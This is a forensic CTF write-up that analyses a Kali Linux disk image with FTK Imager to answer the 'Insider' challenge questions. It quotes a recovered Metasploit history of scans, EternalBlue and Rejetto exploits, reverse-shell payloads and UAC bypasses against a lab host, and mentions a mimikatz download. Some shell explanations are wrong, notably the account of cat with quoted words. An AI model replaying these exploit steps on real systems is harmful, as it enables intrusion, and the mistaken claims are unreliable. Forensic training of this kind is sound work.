# CyberDefenders Insider - https://cyberdefenders.org/blueteam-ctf-challenges/64

This challenge centers around using [FTKImager](https://accessdata.com/product-download/ftk-imager-version-4-5) to analyze a Linux disk image.

1. What distribution of Linux is being used on this machine?
2. What is the MD5 hash of the apache access.log?
3. It is believed that a credential dumping tool was downloaded? What is the file name of the download?
4. There was a super-secret file created. What is the absolute path?
5. What program used didyouthinkwedmakeiteasy.jpg during execution?
6. What is the third goal from the checklist Karen created?
7. How many times was apache run?
8. It is believed this machine was used to attack another. What file proves this?
9. Within the Documents file path, it is believed that Karen was taunting a fellow computer expert through a bash script. Who was Karen taunting?
10. A user su'd to root at 11:26 multiple times. Who was it?
11. Based on the bash history, what is the current working directory?

Let's begin analyzing our disk image!

To open it up with FTK Imager:

* File > Add evidence item > Image file > Select the disk image > Finish

Now if we expand our evidence tree, we'll come across 3 folders within the `root` directory:

![](https://i.imgur.com/QtAm8oF.png)

* `boot`
* `root`
* `var`

If we select the `boot` folder, it becomes apparent what distribution of Linux this image is of:

![](https://i.imgur.com/iUY8L8s.png)

We can safely assume that **Kali Linux** or **Kali** is the Linux distribution being used!

Recall that there were some questions regarding `apache` log files which are usually stored in the `/var/log/apache2` directory, so let's transition to the `/var/log/apache2` directory!

We'll find 3 files here:

![](https://i.imgur.com/SLYkeaS.png)

* `other_vhosts_access.log`
* `error.log`
* `access.log`

But notice the *Size* column for each of these files, it is 0 meaning the files are empty. We can confirm this by displaying the contents of each file (The bottom right pane displays the contents of the file):

![](https://i.imgur.com/0zWBot6.png)

![](https://i.imgur.com/yEp6Q2d.png)

![](https://i.imgur.com/vPfXzlu.png)

Now we know that the contents of each file are indeed empty. Since there is no data within the Apache log files, we can safely assume that **apache was ran 0 times**.

Let's retrieve the hash of the apache `access.log` file!

Right-click the `access.log` file > *Export File Hash List* > Give the CSV file a name & save it anywhere you'd like.

Now when we open the file, we'll see both the MD5 & SHA1 hash along with the filename:

![](https://i.imgur.com/LkjlI5m.png)

So the MD5 hash of the `access.log` file is: **d41d8cd98f00b204e9800998ecf8427e**

Time to begin searching through the `root` folder which contains many subdirectories along with many files:

![](https://i.imgur.com/fTNCItS.png)

One file which stood out to me within the `root` folder was a JPEG image named `irZLAohL.jpeg`:

![](https://i.imgur.com/RWRvH2P.png)

We can export this file by right-clicking it > Export Files > Choose a directory to export the file to:

![](https://i.imgur.com/KTMe11W.png)

This image contains a flag, which isn't relevant to this challenge, but the image appears to be of someone's desktop. Perhaps the attacker took this screenshot when they compromised a victim's machine.

 One of the questions asks for the name of a file which proves that the machine we are analyzing was used to attack another machine, this image could be evidence of that. To add onto that, there is a hidden directory called `.ms4` within the `root` directory, this is a directory for metasploit and there's a `history` file within that hidden directory:

![](https://i.imgur.com/0QX387B.png)

The full contents of the `history` file are:

```
hosts
exit
hosts
exit
db_nmap -sV -O -T5 -Pn 10.0.0.101
db_nmap -sV -O -T5 -Pn 10.0.0.101 -oX ~/nmap_out.xml
db_nmap -sV -O -T5 -Pn 10.0.0.101 -oX /root/nmap_out.xml
search eternal
use exploit/windows/smb/ms17_010_eternalblue
options
set RHOST 10.0.0.101
run
show payloads
use windows/x64/shell/reverse_tcp
search eternal
use exploit/windows/smb/ms17_010_eternalblue
show payloads
set payload windows/x64/meterpreter/reverse_tcp
options
run
workspace
workspace -a Bob
workspace Bob 
workspace 
db_nmap -sS -T4 10.0.0.101
db_nmap -sV -T4 10.0.0.101
show services
show service
services
workspace Bob 
search rejetto
info rejetto
use exploit/windows/http/rejetto_hfs_exec 
info
hosts
set RhOST 10.0.0.101
show infor
show info
run
sessions
sessions
sessions
sessions 1
search psexec
search psexec platform:windows
sessions 1
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_fodhelper 
options
set SESSION 1
options
run
sessions
options
set target Windows x64
options
run
sessions 1
db_nmap -sS -T4 10.0.0.101
db_nmap -sV -T4 10.0.0.101
exit
workspace Bob 
hosts
search rejetto
use exploit/windows/http/rejetto_hfs_exec 
show info
hosts
set RhOST 10.0.0.101
```

I believe that this file is another piece of evidence that this machine was used to attack another machine, though the CTF challenge prefers the image file, `irZLAohL.jpeg`, as the answer.

One of the task questions is regarding the bash history file, this is a file that usually resides in `/home/<username>/.bash_history` so let's dive into that:

```
msfconsole
systemctl status postgresql
systemctl enable postgresql
systemctl start postgresql
msfconsole
msfdb init
msfconsole
shutdown now
touch snky snky > /root/Desktop/SuperSecretFile.txt
cat snky snky > /root/Desktop/SuperSecretFile.txt 
msfconsole 
clear
history
clear
history
whoami
hack
do hack
do hack please
i am a hacker
how to hack
pwd
ls
ls -la
touch delete-me.txt
rm delete-me.txt 
ls
cd Documents/
mkdir myfirsthack
cd myfirsthack/
touch hellworld.sh
vim hellworld.sh 
chmod +x hellworld.sh 
./hellworld.sh 
touch firstscript
vim firstscript 
chmod +x firstscript 
./firstscript 
vim firstscript 
cp firstscript firstscript_fixed
ls
vim firstscript
vim firstscript_fixed 
./firstscript_fixed 
flag<this is a flag>
ifconfig
cd ..
cd..
cd ..
cd /var/log/
ls
cd ..
cd ~
ls
pwf
pwd
top
wall -h
wall yolo
ls
pwd
cd ..
ls
cd home/
ls
cd /root
ls
cd ../root
cd ../root/Documents/myfirsthack/../../Desktop/
sl
ls
cd ../Documents/myfirsthack/
netstat
echo bob.txt
touch bob.txt 
echo "If you're still reading this file, scream cake."
echo "Seriously, we'll give you a hint to answer question if you scream cake."
sudo visudo
ls
sudo ifng
ifconfi
apt get moo
sudo apt get moo
sudo apt install moo
sudo apt-install moo
sudo apt-get install moo
lol Castro just failed at all these commands. Someone pat him on the back. 
I tried okay
history > history.txt
binwalk didyouthinkwedmakeiteasy.jpg 
clear
history
exit
touch keys.txt
pwd
```

The task question asks what the current working directory is, so the key is to focus on the `cd` or change directory commands. The last `cd` command is `cd ../Documents/myfirsthack` so we can assume that the current directory is `/root/Documents/myfirsthack`

If we look further at the bash history, we'll see that the user executed `binwalk didyouthinkwedmakeiteasy.jpg` and there's a task question which asks what program used `didyouthinkwedmakeiteasy.jpg` as an argument during execution, so the answer is `binwalk`!

Question #4 also states that a "super-secret" file was created & asks for the absolute/full path of the file. Examining the bash history, we find this command:

`cat snky snky > /root/Desktop/SuperSecretFile.txt`

This command would simply create the `SuperSecretFile.txt` with empty contents. In order to actually output the words "snky snky" into the file, quotes would have to surround the words within the command, so the appropriate syntax would be:

`cat "snky snky" > /root/Desktop/SuperSecretFile.txt`

But anyways, the "super-secret" file is: `/root/Desktop/SuperSecretFile.txt`!

Now the `myfirsthack` directory was of particular interest to me, mainly out of curiosity! The contents of it consist of bash scripts, a text file, and a fake JPG file:

![](https://i.imgur.com/H98w7Oo.png)

The reason I say fake JPG is because it's actually a text file which contains a modified version of the `.bash_history` file that we examined earlier:

![](https://i.imgur.com/whb4691.png)

The bash scripts are relatively simple:

![](https://i.imgur.com/JGlgvHy.png)

![](https://i.imgur.com/PfvVwlL.png)

![](https://i.imgur.com/JT4s6iQ.png)

But the second script contains the word *Young* which is capitalized, possibly indicating that this is the name of an individual.

![](https://i.imgur.com/PfvVwlL.png)

And one of the questions states that within the Documents path, there's a bash script that taunts a fellow computer expert. Well this is that script, and it's poor **Young** that's being taunted!

Question #3 states that a credential dumping tool may have been downloaded, and asks the filename for the download. We should first check the `/root/Downloads/` folder:

![](https://i.imgur.com/BcB3WJT.png)

MimiKatz was the credential dumping tool downloaded and its filename is **mimikatz_trunk.zip**!

If we continue searching through the subdirectories of `root`, we'd stumble across the `Desktop` directory which contains a `checklist` file:

![](https://i.imgur.com/rnRWuUE.png)

Now we know that the 3rd goal on Karen's checklist is **profit**!

Our last question is asking about a user who `su`'d to root at 11:26, we must determine who performed this action. The log file which contains `su` actions is located at `/var/log/auth.log`, so back to the `/var/log` directory we go!

We don't even need to export the file in order to search through it, we can simply hit `CTRL F` & search for the time which the user `su`'d:

![](https://i.imgur.com/ZiwUNsa.png)

![](https://i.imgur.com/BexqnVh.png)

As you can see, these sessions were attempted & opened for the user `postgres` which is likely the result of the user running `systemctl starts postgresql` which starts the postgresql service which is a database management system that I believe is used in conjunction with Metasploit!
